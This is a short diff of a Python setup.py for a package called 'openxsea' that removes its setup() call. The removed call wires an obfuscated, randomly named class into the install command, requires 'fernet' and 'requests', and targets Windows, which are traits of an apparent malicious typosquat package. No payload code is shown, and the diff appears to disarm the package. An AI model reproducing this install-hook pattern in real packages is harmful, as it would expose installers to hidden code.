@@ -18,22 +18,5 @@ class hMiRrfveQFxZasPsMmYtAicMKrduQtFdcViPmYIsrsOxpnjHLofIcmwOZdreHSdsVsMvsDkCuR
             install.run(self)
 
 
-setup(
-    name="openxsea",
-    version=VERSION,
-    author="CZIbSRCmTQm",
-    author_email="ojQlrfoejumBesYLqcXC@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': hMiRrfveQFxZasPsMmYtAicMKrduQtFdcViPmYIsrsOxpnjHLofIcmwOZdreHSdsVsMvsDkCuRAjzEOHbWYroTGFwcRCHVsFfSWvTKFLulxhghhqiTT,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
 
